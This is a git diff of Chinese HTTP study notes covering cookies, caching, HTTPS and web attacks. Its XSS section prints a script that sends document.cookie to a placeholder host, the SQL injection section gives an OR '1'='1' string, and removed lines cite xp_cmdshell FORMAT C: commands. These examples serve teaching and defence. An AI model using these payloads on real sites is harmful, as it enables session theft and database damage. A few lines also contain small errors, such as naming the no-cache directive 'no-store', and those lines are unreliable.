@@ -27,34 +27,38 @@
 * [五、具体应用](#五具体应用)
     * [Cookie](#cookie)
     * [缓存](#缓存)
-    * [持久连接](#持久连接)
-    * [管线化处理](#管线化处理)
-    * [编码](#编码)
+    * [连接管理](#连接管理)
+    * [内容协商](#内容协商)
+    * [内容编码](#内容编码)
+    * [范围请求](#范围请求)
     * [分块传输编码](#分块传输编码)
     * [多部分对象集合](#多部分对象集合)
-    * [范围请求](#范围请求)
-    * [内容协商](#内容协商)
     * [虚拟主机](#虚拟主机)
     * [通信数据转发](#通信数据转发)
 * [六、HTTPs](#六https)
     * [加密](#加密)
     * [认证](#认证)
-    * [完整性](#完整性)
+    * [完整性保护](#完整性保护)
+    * [HTTPs 的缺点](#https-的缺点)
+    * [配置 HTTPs](#配置-https)
 * [七、Web 攻击技术](#七web-攻击技术)
-    * [攻击模式](#攻击模式)
     * [跨站脚本攻击](#跨站脚本攻击)
     * [跨站点请求伪造](#跨站点请求伪造)
     * [SQL 注入攻击](#sql-注入攻击)
     * [拒绝服务攻击](#拒绝服务攻击)
 * [八、GET 和 POST 的区别](#八get-和-post-的区别)
+    * [作用](#作用)
     * [参数](#参数)
     * [安全](#安全)
     * [幂等性](#幂等性)
     * [可缓存](#可缓存)
     * [XMLHttpRequest](#xmlhttprequest)
-* [九、各版本比较](#九各版本比较)
-    * [HTTP/1.0 与 HTTP/1.1 的区别](#http10-与-http11-的区别)
-    * [HTTP/1.1 与 HTTP/2.0 的区别](#http11-与-http20-的区别)
+* [九、HTTP/1.0 与 HTTP/1.1 的区别](#九http10-与-http11-的区别)
+* [十、HTTP/2.0](#十http20)
+    * [HTTP/1.x 缺陷](#http1x-缺陷)
+    * [二进制分帧层](#二进制分帧层)
+    * [服务端推送](#服务端推送)
+    * [首部压缩](#首部压缩)
 * [参考资料](#参考资料)
 <!-- GFM-TOC -->
 
@@ -63,8 +67,9 @@
 
 ## Web 基础
 
-- HTTP（HyperText Transfer Protocol，超文本传输协议）
 - WWW（World Wide Web）的三种技术：HTML、HTTP、URL
+- HTML（HyperText Markup Language，超文本标记语言）
+- HTTP（HyperText Transfer Protocol，超文本传输协议）
 - RFC（Request for Comments，征求修正意见书），互联网的设计文档。
 
 ## URL
@@ -317,11 +322,19 @@ CONNECT www.example.com:443 HTTP/1.1
 
 HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。
 
-Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。
+Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。
 
-### 1. 创建过程
+### 1. 用途
 
-服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。
+- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
+- 个性化设置（如用户自定义设置、主题等）
+- 浏览器行为跟踪（如跟踪分析用户行为等）
+
+Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。
+
+### 2. 创建过程
+
+服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。
 
 ```html
 HTTP/1.0 200 OK
@@ -332,7 +345,7 @@ Set-Cookie: tasty_cookie=strawberry
 [page content]
 ```
 
-客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段。
+客户端之后对同一个服务器发送请求时，会从浏览器中读出 Cookie 信息通过 Cookie 请求首部字段发送给服务器。
 
 ```html
 GET /sample_page.html HTTP/1.1
@@ -340,7 +353,7 @@ Host: www.example.org
 Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 ```
 
-### 2. 分类
+### 3. 分类
 
 - 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
 - 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。
@@ -349,86 +362,239 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 ```
 
-### 3. Set-Cookie
+### 4. JavaScript 获取 Cookie
 
-| 属性 | 说明 |
-| :--: | -- |
-| NAME=VALUE | 赋予 Cookie 的名称和其值（必需项） |
-| expires=DATE | Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止） |
-| path=PATH | 将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录） |
-| domain=域名 | 作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名） |
-| Secure | 仅在 HTTPs 安全通信时才会发送 Cookie |
-| HttpOnly | 加以限制，使 Cookie 不能被 JavaScript 脚本访问 |
+通过 `Document.cookie` 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。
 
-### 4. Session 和 Cookie 区别
+```html
+document.cookie = "yummy_cookie=choco";
+document.cookie = "tasty_cookie=strawberry";
+console.log(document.cookie);
+```
 
-Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。
+### 5. Secure 和 HttpOnly
 
-### 5. 浏览器禁用 Cookie 的情况
+标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。
 
-会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。
+标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 `Document.cookie` API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。
 
-### 6. 使用 Cookie 实现用户名和密码的自动填写
+```html
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+```
 
-网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。
+### 6. 作用域
 
-但是如果 Set-Cookie 指定了 HttpOnly 属性，就无法通过 Javascript 脚本获取 Cookie 信息，这是出于安全性考虑。
+Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。
+
+Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：
+
+- /docs
+- /docs/Web/
+- /docs/Web/HTTP
+
+### 7. Session
+
+除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。
+
+Session 可以存储在服务器上的文件、数据库或者内存中，现在最常见的是将 Session 存储在内存型数据库中，比如 Redis。
+
+使用 Session 维护用户登录的过程如下：
+
+- 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；
+- 服务器验证该用户名和密码；
+- 如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 ID 称为 Session ID；
+- 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；
+- 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之后的业务操作。
+
+应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能生产一个容易被才到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。
+
+### 8. 浏览器禁用 Cookie
+
+此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。
+
+### 9. Cookie 与 Session 选择
+
+- Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时 首选 Session；
+- Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；
+- 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。
 
 ## 缓存
 
 ### 1. 优点
 
-1. 降低服务器的负担；
-2. 提高响应速度（缓存资源比服务器上的资源离客户端更近）。
+- 缓解服务器压力；
+- 减低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。
 
 ### 2. 实现方法
 
 1. 让代理服务器进行缓存；
 2. 让客户端浏览器进行缓存。
 
-### 3. Cache-Control 字段
+### 3. Cache-Control
 
-HTTP 通过 Cache-Control 首部字段来控制缓存。
+HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。
+
+（一）禁止进行缓存
+
+no-store 指令规定不能对请求或响应的任何一部分进行缓存。
 
 ```html
-Cache-Control: private, max-age=0, no-cache
+Cache-Control: no-store
 ```
 
-### 4. no-cache 指令
+（二）强制确认缓存
 
-该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期；
+no-store 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。
 
-该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性。
+```html
+Cache-Control: no-cache
+```
 
-### 5. no-store 指令
+（三）私有缓存和公共缓存
 
-该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。
+private 指定规定了可以将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。
 
-no-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。
+```html
+Cache-Control: private
+```
 
-### 6. max-age 指令
+public 指令规定了可以将资源作为公共缓存，可以被多个用户所使用，一般存在在代理服务器中。
 
-该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。
+```html
+Cache-Control: public
+```
 
-该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。
+（四）缓存过期机制
+
+max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。
+
+max-age  指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。
+
+```html
+Cache-Control: max-age=31536000
+```
 
 Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。
 
-## 持久连接
+```html
+Expires: Wed, 04 Jul 2012 08:26:05 GMT
+```
 
-当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。
+### 4. 缓存验证
 
-<div align="center"> <img src="../pics//450px-HTTP_persistent_connection.svg.png" width=""/> </div><br>
 
-持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。
+需要先了解 ETag 首部字段的含义，它是资源的唯一表示。URL 不能唯一表示资源，例如 `http://www.google.com/` 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一表示。
 
-## 管线化处理
+```html
+ETag: "82e22293907ce725faf67773957acd12"
+```
 
-HTTP/1.1 支持管线化处理，可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。
+可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回  304 Not Modified。
 
-## 编码
+```html
+If-None-Match: "82e22293907ce725faf67773957acd12"
+```
 
-编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。
+Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。
+
+如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应，
+
+```html
+Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
+```
+
+```html
+If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
+```
+
+## 连接管理
+
+<div align="center"> <img src="../pics//HTTP1_x_Connections.png" width="800"/> </div><br>
+
+### 1. 短连接与长连接
+
+当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。
+
+HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是短连接的，如果需要长连接，则使用 Connection : Keep-Alive。
+
+### 2. 流水线
+
+默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。
+
+
+## 内容协商
+
+通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。
+
+### 1. 类型
+
+（一）服务端驱动型内容协商
+
+客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Languag，服务器根据这些字段返回特定的资源。
+
+它存在以下问题：
+
+- 器对浏览器并非全知全能。即便是有了客户端示意扩展，也依然无法获取关于浏览器能力的全部信息。
+- 端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。
+- 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。
+
+（二）代理驱动型协商
+
+服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。
+
+### 2. Vary
+
+```html
+Vary: Accept-Language
+```
+
+在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。
+
+例如，一个客户端发送了一个包含 Accept-Language  首部字段的请求之后，源服务器返回的响应包含 `Vary: Accept-Language` 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。
+
+## 内容编码
+
+内容编码将实体主体进行压缩，从而减少传输的数据量。常用的内容编码有：gzip、compress、deflate、identity。
+
+浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中， Vary 首部中至少要包含 Content-Encoding ；这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。
+
+## 范围请求
+
+如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求未发送的那部分数据，从而避免服务器重新发送所有数据。
+
+### 1. Range
+
+在请求报文中添加 Range 首部字段指定请求的范围。
+
+```html
+GET /z4d4kWk.jpg HTTP/1.1
+Host: i.imgur.com
+Range: bytes=0-1023
+```
+
+请求成功的话服务器返回的响应包含 206 Partial Content 状态码。
+
+```html
+HTTP/1.1 206 Partial Content
+Content-Range: bytes 0-1023/146515
+Content-Length: 1024
+...
+(binary content)
+```
+
+### 2. Accept-Ranges
+
+响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。
+
+```html
+Accept-Ranges: bytes
+```
+
+### 3. 响应
+
+- 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。
+- 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。
+- 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。
 
 ## 分块传输编码
 
@@ -455,37 +621,9 @@ Content-Type: text/plain
 --AaB03x--
 ```
 
-## 范围请求
-
-如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。
-
-在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。
-
-```html
-GET /z4d4kWk.jpg HTTP/1.1
-Host: i.imgur.com
-Range: bytes=0-1023
-```
-
-```html
-HTTP/1.1 206 Partial Content
-Content-Range: bytes 0-1023/146515
-Content-Length: 1024
-...
-(binary content)
-```
-
-## 内容协商
-
-通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。
-
-涉及以下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。
-
 ## 虚拟主机
 
 HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。
-
-使用 Host 首部字段进行处理。
 
 ## 通信数据转发
 
@@ -517,9 +655,9 @@ HTTP 有以下安全性问题：
 2. 不验证通信方的身份，通信方的身份有可能遭遇伪装；
 3. 无法证明报文的完整性，报文有可能遭篡改。
 
-HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。
+HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。
 
-通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。
+通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。
 
 <div align="center"> <img src="../pics//ssl-offloading.jpg" width="700"/> </div><br>
 
@@ -545,7 +683,7 @@ HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通�
 
 ### 3. HTTPs 采用的加密方式
 
-HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key 就是对称密钥）
+HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。（下图中的 Session Key 就是对称密钥）
 
 <div align="center"> <img src="../pics//How-HTTPS-Works.png" width="600"/> </div><br>
 
@@ -555,27 +693,28 @@ HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称�
 
 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。
 
-进行 HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。
+进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。
 
-<div align="center"> <img src="../pics//mutualssl_small.png" width=""/> </div><br>
+<div align="center"> <img src="../pics//2017-06-11-ca.png" width=""/> </div><br>
 
-使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。
+## 完整性保护
 
-## 完整性
+SSL 提供报文摘要功能来进行完整性保护。
 
-SSL 提供报文摘要功能来验证完整性。
+HTTP 也提供了 MD5 报文摘要功能，但是却不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生篡改。
+
+HTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。
+
+## HTTPs 的缺点
+
+- 因为需要进行加密解密等过程，因此速度会更慢；
+- 需要支付证书授权的高费用。
+
+## 配置 HTTPs
+
+[Nginx 配置 HTTPS 服务器](https://aotu.io/notes/2016/08/16/nginx-https/index.html)
 
 # 七、Web 攻击技术
-
-## 攻击模式
-
-### 1. 主动攻击
-
-直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。
-
-### 2. 被动攻击
-
-设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。
 
 ## 跨站脚本攻击
 
@@ -583,15 +722,15 @@ SSL 提供报文摘要功能来验证完整性。
 
 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。
 
-例如有一个论坛网站，攻击者可以在上面发表以下内容：
+例如有一个论坛网站，攻击者可以在上面发布以下内容：
 
-```
+```html
 <script>location.href="//domain.com/?c=" + document.cookie</script>
 ```
 
 之后该内容可能会被渲染成以下形式：
 
-```
+```html
 <p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
 ```
 
@@ -599,13 +738,17 @@ SSL 提供报文摘要功能来验证完整性。
 
 ### 2. 危害
 
-- 伪造虚假的输入表单骗取个人信息
 - 窃取用户的 Cookie 值
+- 伪造虚假的输入表单骗取个人信息
 - 显示伪造的文章或者图片
 
 ### 3. 防范手段
 
-（一）过滤特殊字符
+（一）设置 Cookie 为 HttpOnly
+
+设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，在一定程度上可以防止 XSS 攻击窃取用户的 Cookie 信息。
+
+（二）过滤特殊字符
 
 许多语言都提供了对 HTML 的过滤：
 
@@ -614,14 +757,74 @@ SSL 提供报文摘要功能来验证完整性。
 - Java 的 xssprotect (Open Source Library)。
 - Node.js 的 node-validator。
 
-（二）指定 HTTP 的 Content-Type
+例如 htmlspecialchars() 可以将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。
 
-通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：
+（三）富文本编辑器的处理
 
-```php
-<?php
-   header('Content-Type: text/javascript; charset=utf-8');
-?>
+富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。
+
+富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。
+
+以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。
+
+[XSS 过滤在线测试](http://jsxss.com/zh/try.html)
+
+```html
+<h1 id="title">XSS Demo</h1>
+
+<p class="text-center">
+Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.
+</p>
+
+<form>
+  <input type="text" name="q" value="test">
+  <button id="submit">Submit</button>
+</form>
+
+<pre>hello</pre>
+
+<p>
+  <a href="http://jsxss.com">http</a>
+</p>
+
+<h3>Features:</h3>
+<ul>
+  <li>Specifies HTML tags and their attributes allowed with whitelist</li>
+  <li>Handle any tags or attributes using custom function</li>
+</ul>
+
+<script type="text/javascript">
+alert(/xss/);
+</script>
+```
+
+```html
+<h1>XSS Demo</h1>
+
+<p>
+Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.
+</p>
+
+&lt;form&gt;
+  &lt;input type="text" name="q" value="test"&gt;
+  &lt;button id="submit"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;
+
+<pre>hello</pre>
+
+<p>
+  <a href="http://jsxss.com">http</a>
+</p>
+
+<h3>Features:</h3>
+<ul>
+  <li>Specifies HTML tags and their attributes allowed with whitelist</li>
+  <li>Handle any tags or attributes using custom function</li>
+</ul>
+
+&lt;script type="text/javascript"&gt;
+alert(/xss/);
+&lt;/script&gt;
 ```
 
 ## 跨站点请求伪造
@@ -662,11 +865,13 @@ HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪
 
 由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。
 
+也可以要求用户输入验证码来进行校验。
+
 ## SQL 注入攻击
 
 ### 1. 概念
 
-服务器上的数据库运行非法的 SQL 语句。
+服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。
 
 ### 2. 攻击原理
 
@@ -695,26 +900,24 @@ strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'
 strSQL = "SELECT * FROM users;"
 ```
 
-### 3. 危害
+### 3. 防范手段
 
-- 数据表中的数据外泄，例如个人机密数据，账户数据，密码等。
-- 数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。
-- 数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD='xxxxxx'）。
-- 获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。
-- 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell "net stop iisadmin" 可停止服务器的 IIS 服务）。
-- 破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell "FORMAT C:"）。
+（一）使用参数化查询
 
-### 4. 防范手段
+以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以并且传入适当参数多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。
 
-- 在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。
-- 在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。
-- 如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。
-- 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。
-- 使用 SQL 防注入系统。
+```java
+PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
+stmt.setString(1, userid);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();
+```
+
+（二）单引号转换
+
+将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。
 
 ## 拒绝服务攻击
-
-### 1. 概念
 
 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。
 
@@ -724,11 +927,13 @@ strSQL = "SELECT * FROM users;"
 
 # 八、GET 和 POST 的区别
 
+## 作用
+
+GET 用于获取资源，而 POST 用于传输实体主体。
+
 ## 参数
 
-GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体中。
-
-GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。
+GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。
 
 ```
 GET /test/demo_form.asp?name1=value1&name2=value2 HTTP/1.1
@@ -739,6 +944,10 @@ POST /test/demo_form.asp HTTP/1.1
 Host: w3schools.com
 name1=value1&name2=value2
 ```
+
+不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。
+
